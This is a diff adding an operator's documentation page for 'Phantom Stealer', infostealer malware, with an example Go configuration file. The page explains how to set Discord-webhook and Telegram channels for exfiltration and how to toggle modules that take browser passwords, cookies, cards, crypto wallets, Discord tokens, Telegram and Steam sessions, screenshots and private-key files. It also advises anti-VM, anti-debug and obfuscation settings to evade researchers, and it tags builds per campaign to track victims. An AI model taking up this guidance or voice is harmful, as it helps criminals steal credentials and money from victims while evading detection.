@@ -1,0 +1,275 @@
+---
+title: 'Configuration Settings'
+description: 'Complete reference for all Phantom Stealer configuration options including module toggles, C2 settings, and anti-analysis features'
+---
+
+## Overview
+
+All configuration settings are defined in `config/config.go`. These values must be set before building the stealer binary.
+
+<Warning>
+Remember to use garble or similar obfuscation for sensitive values like webhook URLs to avoid static detection.
+</Warning>
+
+## C2 Configuration
+
+Configure your command and control endpoints for data exfiltration.
+
+<Warning>
+At least one C2 method (Discord or Telegram) must be configured or exfiltration will fail.
+</Warning>
+
+<ParamField path="DiscordWebhook" type="string" default='""'>
+  Discord webhook URL - PRIMARY exfiltration method.
+  
+  Format: `https://discord.com/api/webhooks/xxxxx/yyyyy`
+  
+  This is the preferred method for receiving stolen data as Discord webhooks are reliable and don't require bot setup.
+</ParamField>
+
+<ParamField path="TelegramToken" type="string" default='""'>
+  Telegram bot token - BACKUP exfiltration method.
+  
+  Only used if Discord fails or isn't set. Obtain from @BotFather on Telegram.
+</ParamField>
+
+<ParamField path="TelegramChatID" type="string" default='""'>
+  Telegram chat ID where data will be sent.
+  
+  Get this from @userinfobot on Telegram by sending `/start`.
+</ParamField>
+
+## Build Information
+
+Identifiers for tracking and avoiding conflicts.
+
+<ParamField path="BuildID" type="string" default='"phantom-v1.0"'>
+  Build identifier for tracking different campaigns.
+  
+  Change this for each campaign to track which victims came from which distribution method.
+</ParamField>
+
+<ParamField path="MutexName" type="string" default='"phantom_mtx_7f3a9b2c"'>
+  Mutex name to prevent multiple instances running simultaneously.
+  
+  <Info>
+  Change this value to avoid detection by mutex scanners and security products that fingerprint known stealer mutexes.
+  </Info>
+</ParamField>
+
+## Module Toggles
+
+Enable or disable specific stealing modules. More modules = more data but also more suspicious behavior.
+
+### Data Collection Modules
+
+<ParamField path="StealBrowsers" type="bool" default="true">
+  Extract passwords, cookies, credit cards, and browsing history from all supported browsers.
+  
+  Targets Chromium-based browsers (Chrome, Edge, Brave, Opera, etc.) and Firefox-based browsers.
+</ParamField>
+
+<ParamField path="StealCrypto" type="bool" default="true">
+  Steal cryptocurrency wallets - both desktop applications and browser extensions.
+  
+  See [Targets](/configuration/targets) for the complete list of supported wallets.
+</ParamField>
+
+<ParamField path="StealDiscord" type="bool" default="true">
+  Extract Discord authentication tokens from desktop clients and browser sessions.
+  
+  Tokens can be used to access accounts without passwords.
+</ParamField>
+
+<ParamField path="StealTelegram" type="bool" default="true">
+  Steal Telegram tdata session files.
+  
+  These files contain session data that can be used to hijack Telegram accounts.
+</ParamField>
+
+<ParamField path="StealSteam" type="bool" default="true">
+  Extract Steam ssfn and config files.
+  
+  These files can be used to bypass Steam Guard on other machines.
+</ParamField>
+
+<ParamField path="TakeScreenshot" type="bool" default="true">
+  Capture a PNG screenshot of the victim's desktop.
+  
+  Useful for understanding what the victim was doing and identifying additional attack vectors.
+</ParamField>
+
+<ParamField path="GrabSystemInfo" type="bool" default="true">
+  Collect system information including hostname, IP address, hardware specs, and OS details.
+  
+  Provides context about the victim machine for further exploitation.
+</ParamField>
+
+### Danger Zone
+
+<Warning>
+These modules are noisier and more likely to trigger detection. Use with caution in production environments.
+</Warning>
+
+<ParamField path="Persistence" type="bool" default="false">
+  Add stealer to Windows registry and startup folder for persistence across reboots.
+  
+  <Warning>
+  Disabled by default. This is very noisy and will trigger most security products.
+  </Warning>
+</ParamField>
+
+<ParamField path="SelfDestruct" type="bool" default="false">
+  Delete the executable after successful execution.
+  
+  <Warning>
+  Disabled by default. Helps avoid forensic analysis but may cause issues if exfiltration fails.
+  </Warning>
+</ParamField>
+
+## Anti-Analysis Features
+
+<Info>
+Recommended to keep both enabled for production builds to evade sandbox and researcher analysis.
+</Info>
+
+<ParamField path="AntiVM" type="bool" default="true">
+  Detect and exit if running in a virtual machine.
+  
+  Checks for VMware, VirtualBox, QEMU, Hyper-V, and other common virtualization platforms.
+</ParamField>
+
+<ParamField path="AntiDebug" type="bool" default="true">
+  Detect and exit if a debugger is attached.
+  
+  Prevents dynamic analysis and reverse engineering attempts.
+</ParamField>
+
+## File Grabber Settings
+
+The file grabber searches specific directories for interesting files based on extension filters.
+
+<ParamField path="FileGrabber" type="bool" default="true">
+  Enable the file grabber module.
+  
+  Searches configured directories for files matching specified extensions.
+</ParamField>
+
+<ParamField path="FileExtensions" type="[]string" default='See below'>
+  List of file extensions to grab from target directories.
+  
+  **Default extensions:**
+  
+  <Accordion title="Documents">
+  - `.txt` - Text files
+  - `.doc` - Word documents (legacy)
+  - `.docx` - Word documents
+  - `.xls` - Excel spreadsheets (legacy)
+  - `.xlsx` - Excel spreadsheets
+  - `.pdf` - PDF documents
+  - `.json` - JSON configuration files
+  - `.csv` - CSV data files
+  </Accordion>
+  
+  <Accordion title="Databases">
+  - `.db` - Generic database files
+  - `.sqlite` - SQLite databases
+  </Accordion>
+  
+  <Accordion title="Crypto & Keys">
+  - `.key` - Private key files
+  - `.pem` - PEM certificates/keys
+  - `.ppk` - PuTTY private keys
+  - `.kdbx` - KeePass password databases
+  </Accordion>
+  
+  <Accordion title="Configuration Files">
+  - `.rdp` - Remote Desktop Protocol files
+  - `.ovpn` - OpenVPN configurations
+  - `.conf` - Generic config files
+  </Accordion>
+  
+  <Accordion title="Wallet Files">
+  - `.wallet` - Wallet data files
+  - `.dat` - Bitcoin wallet.dat and similar
+  </Accordion>
+</ParamField>
+
+<ParamField path="MaxFileSize" type="int64" default="5242880">
+  Maximum file size in bytes (default: 5MB).
+  
+  Files larger than this will be skipped to avoid grabbing huge files that could slow down exfiltration.
+  
+  Formula: `5 * 1024 * 1024 = 5,242,880 bytes`
+</ParamField>
+
+<ParamField path="GrabberPaths" type="[]string">
+  Directories to search for files (relative to user home directory).
+  
+  **Default paths:**
+  - `Desktop` - User desktop folder
+  - `Documents` - User documents folder
+  - `Downloads` - User downloads folder
+  
+  <Info>
+  These directories typically contain the most valuable data. Additional paths can be added but will increase execution time.
+  </Info>
+</ParamField>
+
+## Runtime Configuration
+
+<Warning>
+These values are set at runtime and should not be modified manually.
+</Warning>
+
+The stealer uses a runtime XOR key derived from the victim's hostname. This makes static analysis harder since the encryption key isn't present in the binary.
+
+```go
+var xorKey []byte
+
+func SetKey(key []byte) {
+    xorKey = key
+}
+
+func GetKey() []byte {
+    return xorKey
+}
+```
+
+## Example Configuration
+
+```go
+package config
+
+// C2 Configuration
+var (
+    DiscordWebhook = "https://discord.com/api/webhooks/123456/abcdef"
+    TelegramToken  = ""
+    TelegramChatID = ""
+)
+
+// Build Info
+var (
+    BuildID   = "campaign-january-2026"
+    MutexName = "phantom_custom_mutex_a1b2c3d4"
+)
+
+// Module Toggles
+var (
+    StealBrowsers  = true
+    StealCrypto    = true
+    StealDiscord   = true
+    StealTelegram  = true
+    StealSteam     = true
+    TakeScreenshot = true
+    GrabSystemInfo = true
+    
+    Persistence  = false
+    SelfDestruct = false
+    
+    AntiVM    = true
+    AntiDebug = true
+    
+    FileGrabber = true
+)
+```
